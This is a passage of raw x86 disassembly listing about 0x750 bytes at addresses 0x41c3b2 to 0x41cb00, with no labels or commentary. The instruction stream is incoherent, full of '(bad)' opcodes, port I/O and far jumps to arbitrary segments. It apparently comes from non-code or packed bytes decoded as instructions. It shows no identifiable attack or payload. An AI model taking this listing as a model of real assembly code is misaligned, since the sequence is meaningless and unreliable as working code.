  41c3b2:	add    eax,0xe631744b
  41c3b7:	pop    esi
  41c3b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3b9:	cmp    bl,0x61
  41c3bc:	fstp   TBYTE PTR [ebx]
  41c3be:	pop    edi
  41c3bf:	imul   edx
  41c3c1:	retf   
  41c3c2:	repnz ins BYTE PTR es:[edi],dx
  41c3c4:	jo     0x41c3de
  41c3c6:	push   ds
  41c3c7:	mov    ah,0xa4
  41c3c9:	sub    DWORD PTR [esi-0x30],ecx
  41c3cc:	retf   
  41c3cd:	ins    BYTE PTR es:[edi],dx
  41c3ce:	inc    ecx
  41c3cf:	std    
  41c3d0:	mov    bh,0xf0
  41c3d2:	add    al,BYTE PTR [ebp+ecx*4-0x7a]
  41c3d6:	scas   al,BYTE PTR es:[edi]
  41c3d7:	cli    
  41c3d8:	adc    eax,0xafe9953d
  41c3dd:	inc    esi
  41c3de:	push   0xa5771634
  41c3e3:	xor    DWORD PTR [edi-0x32],ecx
  41c3e6:	pop    esp
  41c3e7:	dec    edx
  41c3e8:	sahf   
  41c3e9:	cmp    al,0xd2
  41c3eb:	in     al,dx
  41c3ec:	stos   BYTE PTR es:[edi],al
  41c3ed:	dec    ecx
  41c3ee:	push   es
  41c3ef:	stc    
  41c3f0:	adc    edi,DWORD PTR [edi]
  41c3f2:	aam    0xde
  41c3f4:	cmp    eax,0x9b68065a
  41c3f9:	mov    al,0xb
  41c3fb:	xor    eax,0x7b8fa51d
  41c400:	jne    0x41c3b6
  41c402:	inc    edi
  41c403:	push   ecx
  41c404:	and    dh,dl
  41c406:	out    0x46,al
  41c408:	mov    ds:0x8138fed3,al
  41c40d:	out    dx,eax
  41c40e:	push   edx
  41c40f:	mov    BYTE PTR [ecx+0x44],cl
  41c412:	fld    DWORD PTR [edx-0xd]
  41c415:	inc    edi
  41c416:	enter  0x4b5b,0xeb
  41c41a:	mov    es,WORD PTR [esi+eax*2]
  41c41d:	es xor ebp,eax
  41c420:	dec    edi
  41c421:	mov    edi,0x8266db81
  41c426:	xlat   BYTE PTR ds:[ebx]
  41c427:	xchg   ebp,ecx
  41c429:	add    DWORD PTR [esi-0x79],esp
  41c42c:	jg     0x41c49c
  41c42e:	out    0xa7,al
  41c430:	pop    edx
  41c431:	sbb    al,0xdd
  41c433:	add    esi,DWORD PTR [ebp+0x49300475]
  41c439:	dec    edi
  41c43a:	addr16 lahf 
  41c43c:	xor    BYTE PTR [ebp-0x7914dfe1],0xef
  41c443:	mov    ds:0x4987c8fa,eax
  41c448:	lods   eax,DWORD PTR ds:[esi]
  41c449:	iret   
  41c44a:	mov    eax,ds:0x4fc37f1c
  41c44f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c450:	jecxz  0x41c4c3
  41c452:	xor    eax,0xda1aa71b
  41c457:	mov    ecx,0x29c8df11
  41c45c:	push   0xf2420f0c
  41c461:	and    al,0x50
  41c463:	and    eax,edi
  41c465:	jg     0x41c45c
  41c467:	int    0x6f
  41c469:	data16 not BYTE PTR [edi-0x3b]
  41c46d:	jno    0x41c3fc
  41c46f:	sub    al,0xac
  41c471:	and    esp,ecx
  41c473:	jl     0x41c4e1
  41c475:	mov    eax,ds:0xaa9cbfb9
  41c47a:	pop    edx
  41c47b:	or     eax,0xede03119
  41c480:	sub    al,0x95
  41c482:	scas   eax,DWORD PTR es:[edi]
  41c483:	daa    
  41c484:	jno    0x41c481
  41c486:	cmp    al,0xcc
  41c488:	inc    esp
  41c489:	dec    edi
  41c48a:	(bad)  
  41c48b:	jmp    0x41c49a
  41c48d:	mov    al,0xce
  41c48f:	aaa    
  41c490:	jmp    0x729a0e48
  41c495:	dec    edi
  41c496:	fisub  DWORD PTR [esi+ebp*1]
  41c499:	js     0x41c4da
  41c49b:	pop    esi
  41c49c:	or     ah,ch
  41c49e:	xchg   DWORD PTR [edi+0x8e0d585],edi
  41c4a4:	rep ins DWORD PTR es:[edi],dx
  41c4a6:	xor    dh,ah
  41c4a8:	pop    eax
  41c4a9:	dec    eax
  41c4aa:	sbb    DWORD PTR [ebx],esp
  41c4ac:	sub    eax,0x2e0e2e9d
  41c4b1:	inc    ebx
  41c4b2:	mov    al,0xa5
  41c4b4:	stos   DWORD PTR es:[edi],eax
  41c4b5:	dec    di
  41c4b7:	adc    DWORD PTR [eax],esp
  41c4b9:	pop    es
  41c4ba:	inc    eax
  41c4bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4bc:	pop    ebp
  41c4bd:	ror    BYTE PTR gs:[eax+ebx*4],1
  41c4c1:	popf   
  41c4c2:	test   BYTE PTR [ebp+0x74c5dd79],bh
  41c4c8:	aad    0x1a
  41c4ca:	sar    DWORD PTR [edx+0x45],cl
  41c4cd:	adc    al,0x77
  41c4cf:	sub    BYTE PTR [eax+ecx*1],dh
  41c4d2:	or     esp,DWORD PTR [eax]
  41c4d4:	adc    edx,edx
  41c4d6:	sub    eax,0xae1f765e
  41c4db:	xchg   edi,eax
  41c4dc:	push   ds
  41c4dd:	cs inc ebp
  41c4df:	lods   eax,DWORD PTR ds:[esi]
  41c4e0:	jmp    0x41c547
  41c4e2:	outs   dx,DWORD PTR ds:[esi]
  41c4e3:	es int3 
  41c4e5:	call   0xf673:0xfbc332d8
  41c4ec:	das    
  41c4ed:	sbb    BYTE PTR [edx+0x1594e57e],cl
  41c4f3:	dec    edx
  41c4f4:	adc    ebp,0x1aeba188
  41c4fa:	and    eax,0x9d6df80a
  41c4ff:	and    edx,esp
  41c501:	jmp    0x29fd24f0
  41c506:	call   0x911399af
  41c50b:	scas   eax,DWORD PTR es:[edi]
  41c50c:	jg     0x41c4e3
  41c50e:	out    0xb1,al
  41c510:	retf   
  41c511:	add    dh,BYTE PTR [edi]
  41c513:	(bad)  
  41c514:	cmp    al,0xe5
  41c516:	std    
  41c517:	mov    ebp,0x9d294f3c
  41c51c:	jbe    0x41c4f9
  41c51e:	je     0x41c4b6
  41c520:	mov    eax,0x2a87e44c
  41c525:	adc    cl,BYTE PTR [edi+ebp*1]
  41c528:	mov    dh,0xb1
  41c52a:	fcom   QWORD PTR [edx-0x45]
  41c52d:	pop    ebp
  41c52e:	(bad)  
  41c52f:	sub    edi,DWORD PTR [ecx+0x50]
  41c532:	in     eax,dx
  41c533:	(bad)
  41c536:	test   eax,0x433875c7
  41c53b:	fwait
  41c53c:	cmp    eax,0x134b2de5
  41c541:	(bad)  [edi-0x7e53e547]
  41c547:	sub    DWORD PTR [edi],edi
  41c549:	inc    esp
  41c54a:	aas    
  41c54b:	imul   eax,DWORD PTR [esi-0x54],0x269932c9
  41c552:	and    al,0xf0
  41c554:	or     edi,DWORD PTR [esi]
  41c556:	daa    
  41c557:	add    ecx,0x49
  41c55a:	add    DWORD PTR [edi],ebp
  41c55c:	imul   ebx,DWORD PTR [edi+0x44],0xffffffef
  41c560:	popa   
  41c561:	lahf   
  41c562:	and    ecx,DWORD PTR [edx+ebp*8+0x51c2f708]
  41c569:	ror    BYTE PTR [ecx],0x0
  41c56c:	mov    al,ds:0xfa07fc03
  41c571:	mov    ah,0x8f
  41c573:	and    dh,BYTE PTR fs:0x53504c8d
  41c57a:	jno    0x41c5dd
  41c57c:	(bad)  [edi+0x7c]
  41c57f:	push   esp
  41c580:	stos   BYTE PTR es:[edi],al
  41c581:	rcr    BYTE PTR [ebx+0x2e],1
  41c584:	ja     0x41c519
  41c586:	pop    ebx
  41c587:	(bad)  [ebx-0x256630cb]
  41c58d:	bound  esp,QWORD PTR [edx-0x56f6696c]
  41c593:	nop
  41c594:	push   es
  41c595:	cli    
  41c596:	push   eax
  41c597:	lods   al,BYTE PTR ds:[esi]
  41c598:	out    0x5d,al
  41c59a:	idiv   DWORD PTR [ecx]
  41c59c:	xchg   edx,eax
  41c59d:	pop    eax
  41c59e:	push   eax
  41c59f:	and    ah,bl
  41c5a1:	pop    es
  41c5a2:	bound  edi,QWORD PTR [ecx-0x12ed7107]
  41c5a8:	dec    ebp
  41c5a9:	push   es
  41c5aa:	add    DWORD PTR [ecx-0x792f7471],edx
  41c5b0:	test   al,0x25
  41c5b2:	mov    ds:0x3a56d004,al
  41c5b7:	inc    esi
  41c5b8:	adc    ah,ah
  41c5ba:	out    0xa7,eax
  41c5bc:	jmp    0x7f40:0x26678381
  41c5c3:	mov    ebp,0x95d3e4a2
  41c5c8:	repz mov ebp,0x9b6692e6
  41c5ce:	jmp    0xaab5:0xe667c5f6
  41c5d5:	loope  0x41c585
  41c5d7:	call   0xce0f:0xb3b9d0ce
  41c5de:	rol    BYTE PTR [ebx+0x77],cl
  41c5e1:	(bad)  
  41c5e2:	mov    eax,0x724fdecd
  41c5e7:	and    eax,0xc5934779
  41c5ec:	add    eax,0xef39470c
  41c5f1:	jns    0x41c660
  41c5f3:	rcr    DWORD PTR [edx+0x22],0x85
  41c5f7:	in     al,0xe6
  41c5f9:	sbb    eax,DWORD PTR [di-0x49]
  41c5fd:	add    edx,0x232bd8ea
  41c603:	mov    ch,al
  41c605:	js     0x41c59b
  41c607:	cld    
  41c608:	int3   
  41c609:	xchg   ebp,eax
  41c60a:	pop    esi
  41c60b:	aas    
  41c60c:	adc    DWORD PTR [edi+eax*4],eax
  41c60f:	mov    ch,0x3e
  41c611:	int3   
  41c612:	imul   eax,DWORD PTR [ecx],0x72
  41c615:	es mov dh,0x11
  41c618:	jnp    0x41c5f3
  41c61a:	(bad)  
  41c61b:	fs out 0x87,eax
  41c61e:	fisttp QWORD PTR [esp+ebx*2+0x1a]
  41c622:	test   eax,0xba2eda99
  41c627:	push   ss
  41c628:	dec    ecx
  41c629:	retf   
  41c62a:	retf   0x1ba8
  41c62d:	xor    dl,BYTE PTR [ebp-0x23]
  41c630:	fisttp QWORD PTR [edx+0x31]
  41c633:	repz data16 aam 0x36
  41c637:	sub    DWORD PTR [eax],ebx
  41c639:	arpl   WORD PTR [ebp-0x15],sp
  41c63c:	dec    ecx
  41c63d:	push   ebp
  41c63e:	pop    ds
  41c63f:	pop    edx
  41c640:	shl    BYTE PTR [ecx-0x43],0x83
  41c644:	adc    edi,DWORD PTR [ebx]
  41c646:	fdiv   st(1),st
  41c648:	jo     0x41c6a4
  41c64a:	dec    ecx
  41c64b:	aas    
  41c64c:	rcl    DWORD PTR [ebx+0x47649f41],0x1b
  41c653:	lods   eax,DWORD PTR ds:[esi]
  41c654:	cmp    BYTE PTR [eax+0x2b4c4361],0xfc
  41c65b:	xchg   edx,eax
  41c65c:	and    bh,bl
  41c65e:	push   0xffffffa6
  41c660:	sub    BYTE PTR ds:[edx+0x18],dh
  41c664:	pusha  
  41c665:	xchg   BYTE PTR [eax+eax*8],dh
  41c668:	pusha  
  41c669:	(bad)  
  41c66a:	sar    BYTE PTR [eax+ebp*1+0x2258fb47],cl
  41c671:	mov    BYTE PTR ds:0xd5ee2d5d,cl
  41c677:	mov    es,WORD PTR [eax]
  41c679:	and    eax,ecx
  41c67b:	retf   0x2c04
  41c67e:	xor    ebp,DWORD PTR [edx]
  41c680:	iret   
  41c681:	pusha  
  41c682:	jmp    0xd56e:0xb26196b2
  41c689:	js     0x41c6ae
  41c68b:	pop    es
  41c68c:	test   BYTE PTR [edi-0x395416c4],bl
  41c692:	sbb    eax,0xcd83412
  41c697:	ins    BYTE PTR es:[edi],dx
  41c698:	pop    edi
  41c699:	push   eax
  41c69a:	jmp    0x41c6eb
  41c69c:	adc    DWORD PTR [esp+ebp*1+0x50e784e0],ecx
  41c6a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6a4:	push   edi
  41c6a5:	data16 jl 0x41c6a6
  41c6a8:	rcl    DWORD PTR [eax],1
  41c6aa:	pop    ebx
  41c6ab:	cmp    eax,0x882f4001
  41c6b0:	daa    
  41c6b1:	imul   eax,DWORD PTR [edi],0xffffffff
  41c6b4:	jo     0x41c647
  41c6b6:	sub    esp,DWORD PTR [edi-0x20579f20]
  41c6bc:	fs xchg esi,eax
  41c6be:	cmp    ebx,DWORD PTR [eax]
  41c6c0:	rcl    dl,1
  41c6c2:	xchg   edx,eax
  41c6c3:	ror    ch,cl
  41c6c5:	cmc    
  41c6c6:	ins    BYTE PTR es:[edi],dx
  41c6c7:	jl     0x41c71e
  41c6c9:	outs   dx,DWORD PTR ds:[esi]
  41c6ca:	retf   0x86aa
  41c6cd:	outs   dx,BYTE PTR ds:[esi]
  41c6ce:	or     al,0xb2
  41c6d0:	push   cs
  41c6d1:	inc    edi
  41c6d2:	sub    al,0x30
  41c6d4:	neg    ch
  41c6d6:	add    DWORD PTR ds:0x1a6f9f43,eax
  41c6dc:	outs   dx,DWORD PTR ds:[esi]
  41c6dd:	(bad)  
  41c6de:	dec    ebp
  41c6df:	sub    BYTE PTR [edx+0x27],0x37
  41c6e3:	jne    0x41c6c8
  41c6e5:	fidiv  WORD PTR [eax+0x2b]
  41c6e8:	mov    al,ds:0x99db434e
  41c6ed:	sbb    al,0x86
  41c6ef:	push   ds
  41c6f0:	xchg   ebx,eax
  41c6f1:	add    eax,0x699b7c2a
  41c6f6:	in     al,dx
  41c6f7:	daa    
  41c6f8:	xchg   esp,eax
  41c6f9:	jg     0x41c732
  41c6fb:	xchg   DWORD PTR [edx+0x5f6cf5b9],ecx
  41c701:	add    DWORD PTR [edx+0x3166ab6b],eax
  41c707:	sbb    DWORD PTR [esi-0x427d142f],ebx
  41c70d:	jmp    0x41c781
  41c70f:	add    al,0xd
  41c711:	outs   dx,BYTE PTR ds:[esi]
  41c712:	xchg   esi,eax
  41c713:	nop
  41c714:	fucomp st(2)
  41c716:	cli    
  41c717:	enter  0xc818,0x68
  41c71b:	jmp    0x4b27:0x3e4603f9
  41c722:	in     al,0x76
  41c724:	mov    esi,0xca04bca2
  41c729:	adc    DWORD PTR [eax+0x11e5782e],eax
  41c72f:	dec    edx
  41c730:	neg    ebp
  41c732:	jo     0x41c7a1
  41c734:	leave  
  41c735:	ret    0xa35f
  41c738:	fadd   QWORD PTR [esi+0x53706d13]
  41c73e:	out    dx,eax
  41c73f:	arpl   WORD PTR [eax+0x2c2a72c0],ax
  41c745:	add    eax,0x209a3539
  41c74a:	mov    ebp,0xf75eb384
  41c74f:	pusha  
  41c750:	scas   eax,DWORD PTR es:[edi]
  41c751:	sub    al,0xb
  41c753:	mov    ds:0x9ae19c80,al
  41c758:	lods   al,BYTE PTR ds:[esi]
  41c759:	jg     0x41c72a
  41c75b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c75c:	add    DWORD PTR [ecx+0x7dbe755f],edx
  41c762:	sbb    al,0x63
  41c764:	and    BYTE PTR [edi-0x3933e2d4],al
  41c76a:	jno    0x41c6ed
  41c76c:	repnz or ah,BYTE PTR [ecx+0x6bfc1e1b]
  41c773:	popf   
  41c774:	mov    esp,0xb1f5db0a
  41c779:	and    esp,0xfffffff3
  41c77c:	scas   eax,DWORD PTR es:[edi]
  41c77d:	dec    ebp
  41c77e:	mov    ch,0x6b
  41c780:	lock add edx,ebp
  41c783:	push   eax
  41c784:	mov    esp,0xcd088c56
  41c789:	enter  0x84a1,0x42
  41c78d:	sbb    esi,esi
  41c78f:	dec    ebx
  41c790:	mov    al,0x33
  41c792:	hlt    
  41c793:	inc    edx
  41c794:	aam    0x1d
  41c796:	cmp    eax,ecx
  41c798:	mov    BYTE PTR [eax],dh
  41c79a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c79b:	loopne 0x41c73d
  41c79d:	push   cs
  41c79e:	or     edx,DWORD PTR [edx+0x4f]
  41c7a1:	sar    DWORD PTR [edx],1
  41c7a3:	mov    WORD PTR [ebx+0x5b3b0912],fs
  41c7a9:	push   cs
  41c7aa:	pop    esi
  41c7ab:	lds    esp,FWORD PTR ds:0x881ce421
  41c7b1:	sbb    bh,dh
  41c7b3:	pop    esp
  41c7b4:	cmp    eax,0x7b385154
  41c7b9:	shl    ebx,0x50
  41c7bc:	push   ebx
  41c7bd:	outs   dx,BYTE PTR ds:[esi]
  41c7be:	mov    eax,ds:0xd41a9244
  41c7c3:	pop    ss
  41c7c4:	test   eax,0x23137f5c
  41c7c9:	test   al,0x49
  41c7cb:	jmp    FWORD PTR [ecx]
  41c7cd:	mov    eax,ds:0x85cbfdfd
  41c7d2:	sbb    al,0x17
  41c7d4:	enter  0x83d4,0x4a
  41c7d8:	not    DWORD PTR [edx-0x4bbc8ec8]
  41c7de:	or     dl,BYTE PTR [ebp-0x7328e571]
  41c7e4:	mov    cl,0x96
  41c7e6:	das    
  41c7e7:	outs   dx,BYTE PTR ds:[esi]
  41c7e8:	outs   dx,DWORD PTR ds:[esi]
  41c7e9:	je     0x41c828
  41c7eb:	gs dec edi
  41c7ed:	mov    ds:0x195ccc59,eax
  41c7f2:	sbb    bl,dh
  41c7f4:	fnsave [esi+0x41]
  41c7f7:	lock xlat BYTE PTR ds:[ebx]
  41c7f9:	pop    ecx
  41c7fa:	scas   al,BYTE PTR es:[edi]
  41c7fb:	jmp    0xce:0x1f6e8c7f
  41c802:	ret    0x6486
  41c805:	div    BYTE PTR [ebx]
  41c807:	arpl   WORD PTR [eax],sp
  41c809:	jl     0x41c7ec
  41c80b:	lahf   
  41c80c:	dec    edx
  41c80d:	mov    ecx,0xd7cc56f6
  41c812:	add    DWORD PTR [eax],ebp
  41c814:	int    0x2d
  41c816:	cmp    si,dx
  41c819:	test   DWORD PTR [eax],edi
  41c81b:	pop    esp
  41c81c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c81d:	out    0x81,al
  41c81f:	aaa    
  41c820:	out    0xb5,al
  41c822:	sub    dl,bh
  41c824:	sub    ch,BYTE PTR [ebx]
  41c826:	sub    ch,dh
  41c828:	call   0x5847:0x6ac9acf9
  41c82f:	popf   
  41c830:	dec    esp
  41c831:	inc    edx
  41c832:	aam    0x37
  41c834:	daa    
  41c835:	std    
  41c836:	pop    ebx
  41c837:	dec    esi
  41c838:	xchg   ebp,eax
  41c839:	jmp    0xdfa5:0x8ae5fd7e
  41c840:	lods   eax,DWORD PTR ds:[esi]
  41c841:	outs   dx,BYTE PTR ds:[esi]
  41c842:	add    DWORD PTR [ebx-0xfec9222],edi
  41c848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c849:	fdivr  QWORD PTR [edx+0x1fec27b2]
  41c84f:	mov    DWORD PTR [eax+edx*2],esp
  41c852:	rol    DWORD PTR [esi+edi*1-0x67],cl
  41c856:	sub    eax,0xb4fc328a
  41c85b:	jmp    0x3f9dc0c4
  41c860:	aas    
  41c861:	push   ds
  41c862:	sti    
  41c863:	js     0x41c8ab
  41c865:	(bad)  
  41c866:	(bad)  
  41c867:	test   al,0xee
  41c869:	push   ss
  41c86a:	dec    ebp
  41c86b:	rcr    DWORD PTR [eax],cl
  41c86d:	test   BYTE PTR [eax-0x7b7d9bb2],0x6a
  41c874:	sbb    edi,ecx
  41c876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c877:	add    eax,0xeeb97f3b
  41c87c:	pop    ebx
  41c87d:	adc    edi,ebx
  41c87f:	dec    eax
  41c880:	add    eax,DWORD PTR [edi-0x69]
  41c883:	pop    ecx
  41c884:	jnp    0x41c8c0
  41c886:	popf   
  41c887:	and    eax,0x590307cf
  41c88c:	add    BYTE PTR [ebp+edx*8+0x27],dl
  41c890:	cmp    ebx,edi
  41c892:	adc    edi,edx
  41c894:	jmp    0x41c86c
  41c896:	sub    dl,BYTE PTR [ecx+ecx*1-0x70]
  41c89a:	stos   BYTE PTR es:[edi],al
  41c89b:	jnp    0x41c896
  41c89d:	lea    esp,[esi+0x0]
  41c8a0:	mov    ebx,DWORD PTR [eax]
  41c8a2:	in     al,dx
  41c8a3:	jp     0x41c8f7
  41c8a5:	xchg   edi,eax
  41c8a6:	and    al,0xd4
  41c8a8:	ins    DWORD PTR es:[edi],dx
  41c8a9:	sbb    BYTE PTR [eax+0x776d5fac],dl
  41c8af:	dec    esi
  41c8b0:	xlat   BYTE PTR ds:[ebx]
  41c8b1:	xchg   ecx,eax
  41c8b2:	push   cs
  41c8b3:	xor    dl,BYTE PTR [edi+edi*2-0x14febbfc]
  41c8ba:	mov    dl,0x59
  41c8bc:	mov    eax,0x809efcfe
  41c8c1:	fsub   DWORD PTR [ebx+0x44f3bb66]
  41c8c7:	fist   DWORD PTR [edi+0x78]
  41c8ca:	imul   ebp,esi,0xe3ee6c23
  41c8d0:	xchg   ecx,eax
  41c8d1:	mov    eax,esp
  41c8d3:	dec    ecx
  41c8d4:	mov    bh,BYTE PTR [eax]
  41c8d6:	(bad)  
  41c8d7:	and    cl,ch
  41c8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8da:	push   eax
  41c8db:	xor    al,BYTE PTR [ebp-0x54000960]
  41c8e1:	xchg   esp,eax
  41c8e2:	sar    ch,0x16
  41c8e5:	add    esp,ebx
  41c8e7:	mov    fs,WORD PTR [ecx+0xeb53e24]
  41c8ed:	dec    edi
  41c8ee:	mov    cs,WORD PTR [ebx]
  41c8f0:	sbb    ebx,DWORD PTR [ebp-0x7d9fe797]
  41c8f6:	ins    BYTE PTR es:[edi],dx
  41c8f7:	xlat   BYTE PTR ds:[ebx]
  41c8f8:	lods   al,BYTE PTR ds:[esi]
  41c8f9:	mov    dh,0x45
  41c8fb:	rol    bl,0xf8
  41c8fe:	cmovbe eax,DWORD PTR [eax+0x1db98494]
  41c905:	pop    esi
  41c906:	ja     0x41c946
  41c908:	fcom   st(1)
  41c90a:	inc    ecx
  41c90b:	mov    ebx,edi
  41c90d:	xchg   esp,eax
  41c90e:	outs   dx,DWORD PTR ds:[esi]
  41c90f:	push   0xffffffd1
  41c911:	sub    BYTE PTR [eax+0x5d9d8fc9],bl
  41c917:	jl     0x41c935
  41c919:	add    eax,0xf99e4b9c
  41c91e:	call   0x4281ddf9
  41c923:	hlt    
  41c924:	hlt    
  41c925:	adc    al,0xe
  41c927:	ret    
  41c928:	mov    DWORD PTR [esi-0x49],esp
  41c92b:	stos   BYTE PTR es:[edi],al
  41c92c:	call   0x9b92a7c2
  41c931:	aam    0x44
  41c933:	sar    esp,cl
  41c935:	addr16 sahf 
  41c937:	fmul   QWORD PTR [ebx+edx*2+0x740c48fe]
  41c93e:	mov    edx,0xd0553c13
  41c943:	sbb    DWORD PTR [edi],edi
  41c945:	cmp    eax,0x93d2a971
  41c94a:	pop    ds
  41c94b:	(bad)  
  41c94c:	jl     0x41c8cf
  41c94e:	adc    DWORD PTR ds:0xcc35e86c,ebp
  41c954:	push   edi
  41c955:	outs   dx,BYTE PTR ds:[esi]
  41c956:	mov    ah,0x11
  41c958:	fild   QWORD PTR [ecx]
  41c95a:	pusha  
  41c95b:	test   eax,0x1001423
  41c960:	sahf   
  41c961:	sub    edx,ecx
  41c963:	push   ebx
  41c964:	cli    
  41c965:	out    dx,eax
  41c966:	jns    0x41c954
  41c968:	mov    esi,0x3c6c4e
  41c96d:	pop    eax
  41c96e:	jae    0x41c9b4
  41c970:	(bad)  
  41c971:	xchg   ecx,eax
  41c972:	stos   BYTE PTR es:[edi],al
  41c973:	sbb    BYTE PTR [edx+0x64],dh
  41c976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c977:	aaa    
  41c978:	push   edi
  41c979:	xchg   edi,eax
  41c97a:	adc    esp,esp
  41c97c:	test   BYTE PTR [ecx],dl
  41c97e:	push   edx
  41c97f:	test   eax,0x7ed79da1
  41c984:	imul   ebx
  41c986:	mov    ch,0x1d
  41c988:	int    0x52
  41c98a:	add    ah,BYTE PTR [esi]
  41c98c:	(bad)
  41c98f:	pop    es
  41c990:	jb     0x41c9fa
  41c992:	sub    eax,0x2d21b236
  41c997:	sub    edx,ebx
  41c999:	ficomp WORD PTR [ebx]
  41c99b:	out    dx,al
  41c99c:	icebp  
  41c99d:	inc    ebx
  41c99e:	ret    0x21e6
  41c9a1:	lock pop ebp
  41c9a3:	lods   al,BYTE PTR ds:[esi]
  41c9a4:	retf   
  41c9a5:	sub    eax,0x289591e2
  41c9aa:	data16 jp 0x41c94c
  41c9ad:	push   ebp
  41c9ae:	pop    ebp
  41c9af:	loope  0x41c950
  41c9b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9b2:	loope  0x41c9b2
  41c9b4:	jg     0x41c9d2
  41c9b6:	hlt    
  41c9b7:	add    edx,DWORD PTR ds:0xf881f7f3
  41c9bd:	xchg   edi,eax
  41c9be:	mov    bl,0x7c
  41c9c0:	mov    al,ds:0x7a16cee
  41c9c5:	fldpi  
  41c9c7:	adc    al,0x3
  41c9c9:	sub    al,0x2e
  41c9cb:	add    DWORD PTR [edi-0x5756ba34],ebp
  41c9d1:	jmp    0xa7:0x8b6c67e1
  41c9d8:	(bad)  
  41c9d9:	jno    0x41c9d1
  41c9db:	sub    al,0xd9
  41c9dd:	les    eax,FWORD PTR [edx+ebp*8]
  41c9e0:	dec    edx
  41c9e1:	dec    ebp
  41c9e2:	dec    esi
  41c9e3:	xor    edi,DWORD PTR [eax+eax*8+0x46fae160]
  41c9ea:	cmp    eax,0x7cabcb9b
  41c9ef:	out    dx,eax
  41c9f0:	or     dh,dh
  41c9f2:	bound  esi,QWORD PTR [ebx-0x66]
  41c9f5:	mov    ebp,0xaa5bdf4e
  41c9fa:	(bad)  
  41c9fc:	loopne 0x41ca2d
  41c9fe:	sar    DWORD PTR [ecx],1
  41ca00:	test   DWORD PTR [ebx],edx
  41ca02:	test   eax,0xceb4dd34
  41ca07:	scas   eax,DWORD PTR es:[edi]
  41ca08:	dec    ebp
  41ca09:	(bad)  
  41ca0a:	jg     0x41ca80
  41ca0c:	add    al,0x3b
  41ca0e:	idiv   BYTE PTR [ecx]
  41ca10:	jmp    0x41ca4a
  41ca12:	inc    edx
  41ca13:	lahf   
  41ca14:	adc    eax,0x6b4d0ac7
  41ca19:	sub    al,0xa7
  41ca1b:	lods   eax,DWORD PTR ds:[esi]
  41ca1c:	mov    cl,0xe4
  41ca1e:	and    BYTE PTR gs:[ebp+0x2027c99d],ch
  41ca25:	pop    ebx
  41ca26:	and    DWORD PTR [ebx],ecx
  41ca28:	jmp    0x41c9e8
  41ca2a:	icebp  
  41ca2b:	or     esi,ebx
  41ca2d:	inc    ecx
  41ca2e:	data16 scas al,BYTE PTR es:[edi]
  41ca30:	aas    
  41ca31:	adc    bh,bl
  41ca33:	jno    0x41ca9a
  41ca35:	pop    edx
  41ca36:	das    
  41ca37:	sahf   
  41ca38:	test   DWORD PTR [edx+0x60cedf8c],esp
  41ca3e:	mov    bl,BYTE PTR [ecx-0x5ca8b1b0]
  41ca44:	mov    al,0x91
  41ca46:	xchg   esp,eax
  41ca47:	aad    0xd3
  41ca49:	mov    al,0x34
  41ca4b:	or     BYTE PTR [ecx-0x73],ch
  41ca4e:	test   BYTE PTR [ebx],0x66
  41ca51:	jmp    0xd7f1c550
  41ca56:	pop    ebx
  41ca57:	inc    ecx
  41ca58:	popf   
  41ca59:	loopne 0x41ca61
  41ca5b:	jecxz  0x41ca81
  41ca5d:	fidiv  DWORD PTR [edx+0x5278638]
  41ca63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca64:	mov    BYTE PTR [edx],al
  41ca66:	mov    edx,0x8d65665e
  41ca6b:	dec    esp
  41ca6c:	fst    QWORD PTR [ebx]
  41ca6e:	push   ebp
  41ca6f:	mov    al,ds:0xb72c54ed
  41ca74:	repz push es
  41ca76:	popf   
  41ca77:	shl    BYTE PTR [eax-0x4e],1
  41ca7a:	loopne 0x41ca07
  41ca7c:	sbb    dl,bh
  41ca7e:	mov    ds:0xa19c8af6,al
  41ca83:	fimul  WORD PTR [eax-0x6e5e81bc]
  41ca89:	rol    DWORD PTR [ecx+0x6e],1
  41ca8c:	mov    edx,0x27ced2d0
  41ca91:	sbb    esi,ecx
  41ca93:	xadd   DWORD PTR [edi+0x5d],ebp
  41ca97:	sbb    ecx,DWORD PTR [ecx+0x1cdd899]
  41ca9d:	xor    DWORD PTR [edi+0x3a4a1180],ebp
  41caa3:	sub    DWORD PTR [ecx+eax*2],ebx
  41caa6:	lock push ss
  41caa8:	in     al,0xf8
  41caaa:	retf   
  41caab:	xor    al,0xe3
  41caad:	inc    ebp
  41caae:	push   ds
  41caaf:	push   ss
  41cab0:	icebp  
  41cab1:	sbb    al,0xc9
  41cab3:	shl    BYTE PTR [ebx+0x39],1
  41cab6:	daa    
  41cab7:	es push es
  41cab9:	jl     0x41ca4c
  41cabb:	mov    ecx,0x538a0bd
  41cac0:	mov    al,ds:0x51c6120d
  41cac5:	aas    
  41cac6:	hlt    
  41cac7:	lock das 
  41cac9:	inc    edi
  41caca:	out    0x32,al
  41cacc:	cmp    al,0xf
  41cace:	push   0x0
  41cad0:	jecxz  0x41cacc
  41cad2:	cwde   
  41cad3:	pop    eax
  41cad4:	fcmovb st,st(4)
  41cad6:	jl     0x41cb15
  41cad8:	mov    edx,0xc47c6bea
  41cadd:	cmp    edx,eax
  41cadf:	dec    ecx
  41cae0:	cli    
  41cae1:	pop    esp
  41cae2:	jo     0x41caf9
  41cae4:	jne    0x41cadd
  41cae6:	cmp    ch,BYTE PTR [ecx+0x4baa7be9]
  41caec:	lock das 
  41caee:	test   DWORD PTR [edx],ebp
  41caf0:	mov    WORD PTR [esi-0x4648f7d7],gs
  41caf6:	xor    BYTE PTR [edi],ah
  41caf8:	pop    esp
  41caf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cafa:	outs   dx,BYTE PTR ds:[esi]
  41cafb:	frstor [edi]
  41cafd:	pushf  
  41cafe:	pop    edi
  41caff:	aaa    
  41cb00:	push   esp
